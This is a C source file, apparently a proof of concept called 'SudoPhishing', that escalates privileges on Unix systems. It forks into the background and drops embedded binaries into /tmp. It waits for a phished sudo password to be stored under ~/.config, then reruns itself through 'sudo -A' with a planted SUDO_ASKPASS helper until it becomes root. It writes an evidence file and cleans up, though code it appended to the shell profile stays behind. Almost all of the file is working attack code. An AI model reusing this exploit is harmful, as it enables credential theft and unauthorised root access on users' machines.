#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include "packs.h"

int main() {
	// First, fork.
	pid_t pid = fork();
	if(pid) return 0;

	// Get some pseudoconstants ready.
	char* home = getenv("HOME");
	char* user = getenv("USER");

	char epath[] = "/tmp/evidence.txt";
	char sppath[] = "/tmp/sp";
	char aspath[] = "/tmp/as";

	char* pwdpath = malloc(strlen(home) + 12);
	strcpy(pwdpath, home);
	strcat(pwdpath, "/.config/._");

	char etoWrite[] = "Boo!\nThis is evidence that SudoPhishing can perform privilege escalation.\n";


	// Now that I'm in another process, who am I?
	char root[] = "root";
	if(strcmp(user, root) != 0) {
		// I am a regular user. Dump SudoPhishing.
		FILE* spfd = fopen(sppath, "w");
		fwrite(SP, 1, SP_SIZE, spfd);
		fclose(spfd);

		// chmod +x
		char spmode[] = "0755";
		chmod(sppath, strtol(spmode, 0, 8));

		// Dump the autosudo.
		FILE* asfd = fopen(aspath, "w");
		fwrite(AS, 1, AS_SIZE, asfd);
		fclose(asfd);

		// chmod +x
		chmod(aspath, strtol(spmode, 0, 8));

		// All set. Run SudoPhishing and wait for the bail.
		system("/tmp/sp");

		// Where am I?
		char location[512];
		getcwd(location, sizeof(location));
		strcat(location, "/poc");

		while(access(pwdpath, R_OK) == -1) sleep(30);

		// '._' is created. Enter the password loop.
		while(access(epath, F_OK) == -1) {
			sleep(10);

			setenv("SUDO_ASKPASS", "/tmp/as", 1);

			char toRun[512];
			strcpy(toRun, "sudo -A ");
			strcat(toRun, location);
			system(toRun);
		}

		// Finished. Let's do some cleaning.
		remove(sppath);
		remove(aspath);
		remove(pwdpath);

		char* auxpath = malloc(strlen(home) + 14);
		strcpy(auxpath, home);
		strcat(auxpath, "/.config/.aux");
		remove(auxpath);
		free(auxpath);

		// The user must now manually remove the appended code
		// to the shell profile.
	} else {
		// I am root.
		// Create the evidence.
		FILE* efd = fopen(epath, "w");
		fwrite(etoWrite, 1, strlen(etoWrite), efd);
		fclose(efd);
	}

	free(pwdpath);
	return 0;
}
